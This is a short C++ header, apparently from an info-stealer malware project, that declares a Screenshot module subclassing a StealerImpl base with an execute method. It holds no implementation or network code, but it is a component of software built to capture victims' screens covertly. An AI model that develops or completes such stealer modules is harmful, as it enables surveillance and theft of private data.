//
// Created by .1qxz on 06.06.2024.
//

#ifndef STEALER_SCREENSHOT_H
#define STEALER_SCREENSHOT_H


#include "../StealerImpl.h"

class Screenshot : public StealerImpl {
public:
    void execute(fs::path& root) override;
};


#endif //STEALER_SCREENSHOT_H
